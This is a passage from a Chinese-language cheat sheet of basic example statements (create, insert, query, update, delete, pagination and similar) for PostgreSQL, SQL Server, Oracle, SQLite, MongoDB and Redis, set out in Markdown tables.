| **连表查询** | `SELECT u.name, o.order_no FROM users u JOIN orders o ON u.id = o.user_id;` | 用户和订单关联查询          |
| **分页查询** | `SELECT * FROM users LIMIT 10 OFFSET 20;`                    | 分页查询（第3页，每页10条） |

### PostgreSQL

| 操作         | 语句示例                                                     | 说明                          |
| :----------- | :----------------------------------------------------------- | :---------------------------- |
| **创建表**   | `CREATE TABLE users (id SERIAL PRIMARY KEY, name VARCHAR(50), age INTEGER);` | 创建users表，SERIAL是自增类型 |
| **插入数据** | `INSERT INTO users (name, age) VALUES ('张三', 25);`         | 插入单条数据                  |
| **批量插入** | `INSERT INTO users (name, age) VALUES ('李四', 30), ('王五', 28);` | 插入多条数据                  |
| **查询数据** | `SELECT * FROM users WHERE age > 25;`                        | 查询年龄大于25的用户          |
| **更新数据** | `UPDATE users SET age = 26 WHERE name = '张三';`             | 更新张三的年龄                |
| **删除数据** | `DELETE FROM users WHERE id = 1;`                            | 删除ID为1的用户               |
| **删除表**   | `DROP TABLE users;`                                          | 删除users表                   |
| **JSON查询** | `SELECT * FROM users WHERE info->>'city' = '北京';`          | 查询JSON字段                  |
| **窗口函数** | `SELECT name, age, RANK() OVER (ORDER BY age DESC) FROM users;` | 使用窗口函数排名              |
| **分页查询** | `SELECT * FROM users LIMIT 10 OFFSET 20;`                    | 分页查询                      |

### SQL Server

| 操作         | 语句示例                                                     | 说明                       |
| :----------- | :----------------------------------------------------------- | :------------------------- |
| **创建表**   | `CREATE TABLE users (id INT IDENTITY(1,1) PRIMARY KEY, name NVARCHAR(50), age INT);` | IDENTITY表示自增           |
| **插入数据** | `INSERT INTO users (name, age) VALUES ('张三', 25);`         | 插入单条数据               |
| **批量插入** | `INSERT INTO users (name, age) VALUES ('李四', 30), ('王五', 28);` | SQL Server 2008+支持       |
| **查询数据** | `SELECT * FROM users WHERE age > 25;`                        | 查询年龄大于25的用户       |
| **更新数据** | `UPDATE users SET age = 26 WHERE name = '张三';`             | 更新张三的年龄             |
| **删除数据** | `DELETE FROM users WHERE id = 1;`                            | 删除ID为1的用户            |
| **删除表**   | `DROP TABLE users;`                                          | 删除users表                |
| **分页查询** | `SELECT * FROM users ORDER BY id OFFSET 20 ROWS FETCH NEXT 10 ROWS ONLY;` | SQL Server 2012+的分页语法 |
| **TOP查询**  | `SELECT TOP 10 * FROM users ORDER BY age DESC;`              | 查询前10条                 |
| **存储过程** | `EXEC sp_rename 'old_table', 'new_table';`                   | 执行存储过程               |

### Oracle

| 操作          | 语句示例                                                     | 说明                  |
| :------------ | :----------------------------------------------------------- | :-------------------- |
| **创建表**    | `CREATE TABLE users (id NUMBER GENERATED BY DEFAULT AS IDENTITY PRIMARY KEY, name VARCHAR2(50), age NUMBER);` | Oracle 12c+的自增语法 |
| **插入数据**  | `INSERT INTO users (name, age) VALUES ('张三', 25);`         | 插入单条数据          |
| **批量插入**  | `INSERT ALL INTO users (name, age) VALUES ('李四', 30) INTO users (name, age) VALUES ('王五', 28) SELECT 1 FROM DUAL;` | Oracle批量插入        |
| **查询数据**  | `SELECT * FROM users WHERE age > 25;`                        | 查询年龄大于25的用户  |
| **更新数据**  | `UPDATE users SET age = 26 WHERE name = '张三';`             | 更新张三的年龄        |
| **删除数据**  | `DELETE FROM users WHERE id = 1;`                            | 删除ID为1的用户       |
| **删除表**    | `DROP TABLE users;`                                          | 删除users表           |
| **分页查询**  | `SELECT * FROM (SELECT t.*, ROWNUM rn FROM (SELECT * FROM users ORDER BY id) t WHERE ROWNUM <= 30) WHERE rn > 20;` | Oracle传统分页        |
| **序列使用**  | `INSERT INTO users (id, name, age) VALUES (user_seq.NEXTVAL, '张三', 25);` | 使用序列插入          |
| **MERGE语句** | `MERGE INTO users u USING (SELECT '张三' name FROM DUAL) s ON (u.name = s.name) WHEN MATCHED THEN UPDATE SET age = 27 WHEN NOT MATCHED THEN INSERT (name, age) VALUES (s.name, 25);` | MERGE操作             |

### SQLite

| 操作           | 语句示例                                                     | 说明                  |
| :------------- | :----------------------------------------------------------- | :-------------------- |
| **创建表**     | `CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, age INTEGER);` | AUTOINCREMENT表示自增 |
| **插入数据**   | `INSERT INTO users (name, age) VALUES ('张三', 25);`         | 插入单条数据          |
| **批量插入**   | `INSERT INTO users (name, age) VALUES ('李四', 30), ('王五', 28);` | 插入多条数据          |
| **查询数据**   | `SELECT * FROM users WHERE age > 25;`                        | 查询年龄大于25的用户  |
| **更新数据**   | `UPDATE users SET age = 26 WHERE name = '张三';`             | 更新张三的年龄        |
| **删除数据**   | `DELETE FROM users WHERE id = 1;`                            | 删除ID为1的用户       |
| **删除表**     | `DROP TABLE users;`                                          | 删除users表           |
| **命令行操作** | `.mode column` `.headers on` `SELECT * FROM users;`          | SQLite命令行格式化    |
| **导入导出**   | `.output data.txt` `SELECT * FROM users;` `.output stdout`   | 导出数据到文件        |
| **附加数据库** | `ATTACH DATABASE 'other.db' AS other;`                       | 附加其他数据库        |

### MongoDB (NoSQL)

| 操作         | 语句示例                                                     | 说明                 |
| :----------- | :----------------------------------------------------------- | :------------------- |
| **创建集合** | `db.createCollection("users");`                              | 创建users集合（表）  |
| **插入文档** | `db.users.insertOne({name: "张三", age: 25, city: "北京"});` | 插入单个文档         |
| **批量插入** | `db.users.insertMany([{name: "李四", age: 30}, {name: "王五", age: 28}]);` | 插入多个文档         |
| **查询文档** | `db.users.find({age: {$gt: 25}});`                           | 查询年龄大于25的文档 |
| **条件查询** | `db.users.find({age: {$gt: 20, $lt: 30}, city: "北京"});`    | 多条件查询           |
| **更新文档** | `db.users.updateOne({name: "张三"}, {$set: {age: 26}});`     | 更新单个文档         |
| **删除文档** | `db.users.deleteOne({name: "张三"});`                        | 删除单个文档         |
| **删除集合** | `db.users.drop();`                                           | 删除users集合        |
| **聚合查询** | `db.users.aggregate([{$match: {age: {$gt: 25}}}, {$group: {_id: "$city", count: {$sum: 1}}}]);` | 聚合查询             |
| **索引创建** | `db.users.createIndex({name: 1});`                           | 创建索引             |
| **排序分页** | `db.users.find().sort({age: -1}).skip(20).limit(10);`        | 排序和分页           |

### Redis (键值存储)

| 操作           | 语句示例                                                     | 说明               |
| :------------- | :----------------------------------------------------------- | :----------------- |
| **设置字符串** | `SET user:1 "{\"name\":\"张三\",\"age\":25}"`                | 设置键值对         |
| **获取字符串** | `GET user:1`                                                 | 获取键对应的值     |
| **设置哈希**   | `HSET user:1 name "张三" age 25 city "北京"`                 | 设置哈希字段       |
| **获取哈希**   | `HGET user:1 name` 或 `HGETALL user:1`                       | 获取哈希字段或全部 |
| **列表操作**   | `LPUSH users "张三"` `RPUSH users "李四"` `LRANGE users 0 -1` | 列表操作           |
| **集合操作**   | `SADD tags "python" "mysql" "redis"` `SMEMBERS tags`         | 集合操作           |
| **有序集合**   | `ZADD scores 95 "张三" 88 "李四"` `ZRANGE scores 0 -1 WITHSCORES` | 有序集合操作       |
| **删除键**     | `DEL user:1`                                                 | 删除键             |
| **过期设置**   | `SETEX session:abc 3600 "user_data"`                         | 设置带过期时间的键 |
| **批量操作**   | `MSET user:1 "张三" user:2 "李四"` `MGET user:1 user:2`      | 批量设置和获取     |
| **发布订阅**   | `PUBLISH news "hello"` `SUBSCRIBE news`                      | 发布订阅模式       |
| **事务操作**   | `MULTI` `SET a 1` `SET b 2` `EXEC`                           | 事务操作           |